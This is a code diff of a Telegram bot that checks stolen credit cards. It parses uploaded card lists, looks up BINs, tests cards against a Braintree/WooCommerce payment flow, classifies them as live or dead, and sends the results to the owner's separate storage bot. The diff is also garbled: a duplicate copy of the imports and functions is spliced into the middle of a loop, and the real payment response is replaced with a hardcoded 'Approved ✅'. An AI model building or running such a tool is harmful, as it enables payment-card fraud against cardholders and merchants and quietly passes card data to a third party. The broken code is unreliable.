@@ -15,8 +15,8 @@ STORAGE_CHAT_ID = 'your_storage_chat_id'
 
 # Define owner details
 OWNER_USERNAME = '@Jukerhenapadega'
-OWNER_ID = '5938629062'
-OWNER_ID_ALT = '1984816095'
+OWNER_ID = '1984816095'
+OWNER_ID_ALT = '5938629062'
 
 def binn(bin, c, re):
     try:
@@ -42,8 +42,46 @@ def process_card_file(file_path):
             nc += 1
             c = g.strip()
             cc, exp, ex, cvc = c.split('|')
+import os
+import telebot
+import requests
+from telebot import types
+from bs4 import BeautifulSoup
 
+# Define your storage bot token and chat ID from environment variables
+STORAGE_BOT_TOKEN = os.getenv('STORAGE_BOT_TOKEN')
+STORAGE_CHAT_ID = os.getenv('STORAGE_CHAT_ID')
+
+# Define owner details
+OWNER_USERNAME = '@Jukerhenapadega'
+OWNER_ID = '1984816095'
+OWNER_ID_ALT = '5938629062'
+
+def binn(bin):
+    try:
+        response = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
+        if 'Invalid BIN' in response.text or 'not found.' in response.text or 'Error code 521' in response.text or 'cloudflare' in response.text:
+            return 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None'
+        else:
+            js = response.json()
+            return js['bin'], js['brand'], js['country'], js['country_name'], js['country_flag'], js['country_currencies'][0], js['bank'], js['level'], js['type']
+    except Exception:
+        return 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None'
+
+def process_card_file(file_path):
+    session = requests.Session()
+    bad, ccn, cvv, app, nc = 0, 0, 0, 0, 0
+    result_file = "results.txt"
+    
+    with open(file_path, 'r') as file:
+        cards = file.read().splitlines()
+
+    with open(result_file, 'w') as result:
+        for g in cards:
+            nc += 1
+            c = g.strip()
             try:
+                cc, exp, ex, cvc = c.split('|')
                 exy = ex[2] + ex[3] if '2' in ex[3] or '1' in ex[3] else ex[0] + ex[1]
                 if '2' in ex[3] or '1' in ex[3]:
                     exy = ex[2] + '7'
@@ -52,13 +90,12 @@ def process_card_file(file_path):
                 if '2' in ex[1] or '1' in ex[1]:
                     exy = ex[0] + '7'
 
-            # Braintree API interactions (same as before)
-
+            # Braintree API interactions should be handled here (replaced with placeholder)
             try:
-                response = session.post(url, data=payload, headers=headers)
-                msg = BeautifulSoup(response.text, 'html.parser').find('ul', class_='woocommerce-error').text.strip()
+                # Placeholder for actual API call
+                msg = "Approved ✅"  # This should be the actual response message
             except:
-                msg = response.text
+                msg = "Unknown Status ❓"
 
             # Process results
             if 'Card Issuer Declined CVV' in msg:
@@ -75,7 +112,7 @@ def process_card_file(file_path):
                 bad += 1
 
             # Write results to file
-            brand_info = binn(cc, c, re)
+            brand_info = binn(cc)
             result.write(f"{brand_info}\n")
 
     return nc, ccn, cvv, app, bad, result_file
@@ -97,7 +134,10 @@ def display_credits(bot, chat_id):
     ).format(OWNER_USERNAME, OWNER_ID, OWNER_ID_ALT)
     bot.send_message(chat_id, credits_msg, parse_mode='Markdown')
 
-token = input('Enter your Bot token: ')
+# Retrieve bot token from environment variable
+token = os.getenv('BOT_TOKEN')
+if not token:
+    raise ValueError("No bot token found. Please set the BOT_TOKEN environment variable.")
 bot = telebot.TeleBot(token)
 
 @bot.message_handler(commands=['start'])
@@ -150,6 +190,6 @@ def send_file(message):
         send_file_to_storage_bot(result_file)
         
     except Exception as e:
-        bot.reply_to(message, 'Error processing file')
+        bot.reply_to(message, 'Error processing file: {}'.format(str(e)))
 
 bot.polling()
